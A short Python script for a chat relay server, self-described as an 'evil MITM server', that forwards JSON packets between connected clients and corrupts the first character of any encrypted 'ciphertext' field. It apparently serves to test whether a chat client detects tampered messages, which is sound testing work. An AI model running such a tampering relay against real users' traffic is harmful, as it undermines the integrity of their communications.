import socket
import threading
import json

# Configuration
DEFAULT_PORT = 6000
HOST = '0.0.0.0' 

clients = []

def tamper_packet(data):
    """😈 THE MALICIOUS FUNCTION"""
    try:
        # 1. Decode the JSON packet
        packet_str = data.decode('utf-8')
        packet = json.loads(packet_str)
        
        # 2. Check if it's a message packet (has ciphertext)
        if 'ciphertext' in packet:
            print(f"\n[😈 MITM ATTACK] Intercepted message! Tampering with data...")
            
            # 3. CORRUPT THE DATA
            # We replace the first character of the encrypted ciphertext with 'A'
            original_cipher = packet['ciphertext']
            corrupted_cipher = 'A' + original_cipher[1:] 
            
            packet['ciphertext'] = corrupted_cipher
            
            # 4. Re-pack as JSON
            new_data = json.dumps(packet).encode('utf-8')
            return new_data
            
    except Exception as e:
        print(f"Failed to tamper: {e}")
    
    # If we couldn't tamper (or it wasn't a message), return original
    return data

def broadcast(message, _client_socket):
    """Sends packet to everyone except sender, BUT TAMPERS WITH IT FIRST."""
    
    # --- INJECT ATTACK HERE ---
    malicious_message = tamper_packet(message)
    # --------------------------
    
    for client in clients:
        if client != _client_socket:
            try:
                client.send(malicious_message)
            except:
                if client in clients:
                    clients.remove(client)

def handle_client(client_socket):
    while True:
        try:
            message = client_socket.recv(8192)
            if not message:
                break
            broadcast(message, client_socket)
        except:
            if client_socket in clients:
                clients.remove(client_socket)
            client_socket.close()
            break

def start_server():
    print("--- 😈 EVIL MITM SERVER RUNNING ---")
    print("This server will intentionally corrupt encrypted messages.")
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server.bind((HOST, DEFAULT_PORT))
        server.listen()
        print(f"✅ Listening on {HOST}:{DEFAULT_PORT}")
        
        while True:
            client_socket, addr = server.accept()
            print(f"🔗 Victim connected: {addr}")
            clients.append(client_socket)
            thread = threading.Thread(target=handle_client, args=(client_socket,))
            thread.start()
    except OSError as e:
        print(f"❌ Error: {e}")

if __name__ == "__main__":
    start_server()